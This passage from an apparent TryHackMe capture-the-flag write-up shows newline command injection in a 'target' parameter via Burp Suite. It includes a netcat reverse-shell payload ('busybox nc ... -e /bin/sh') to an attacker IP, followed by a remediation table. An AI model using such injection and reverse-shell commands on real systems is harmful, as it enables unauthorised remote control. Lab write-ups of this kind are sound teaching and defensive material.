3.4 Bypassing Client-Side Validation with Burp Suite

We intercept the POST request to /internal/health in Burp Suite Community Edition v2026.3.2:

The POST body parameter is target=127.0.0.1. We modify the request to inject a newline-based command injection:

target=127.0.0.1

The server executes whoami and returns www-data — confirming OS command injection via newline character.

The output shows:

3.5 Reverse Shell via Command Injection

We craft a reverse shell payload in Burp Suite:

target=127.0.0.1
busybox nc 192.168.132.94 4444 -e /bin/sh

On our attacker machine, we listen with Penelope (enhanced netcat listener):

penelope nc -p 4444

Forward the requests
Connection received! We get a reverse shell as www-data on tryhackme-2204 (10.48.130.140).

We land in /opt/netops as www-data.

6. Security Mitigations & Remediation

Vulnerability Impact Recommended Remediation
SQL Injection in Login Form Complete authentication bypass; unauthorized access to monitoring dashboard and all operator functions. Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.
OS Command Injection (Newline in ping) Remote Code Execution as www-data. Attacker gains interactive shell on the server. Sanitize all user input with strict allowlists (IPv4 regex). Use Python subprocess with argument lists instead of shell commands.
Client-Side Only Input Validation Easily bypassed with Burp Suite or curl. Provides no security. Always enforce server-side validation. Client-side checks are UX only.
Hardcoded Credentials in Config File sysadmin password in plaintext (secret.config) enables lateral movement via SSH. Use a secrets manager (e.g., HashiCorp Vault, AWS Secrets Manager). Never store passwords in application config files.
Weak KeePass Master Password spring is trivially crackable with rockyou.txt. Exposes all stored credentials including root. Use a strong, unique master password (20+ characters, mixed case, numbers, symbols).
Root Password Stored in KeePass Full system compromise once KeePass is breached. Disable root password login. Use SSH key-based authentication and sudo with individual accounts.
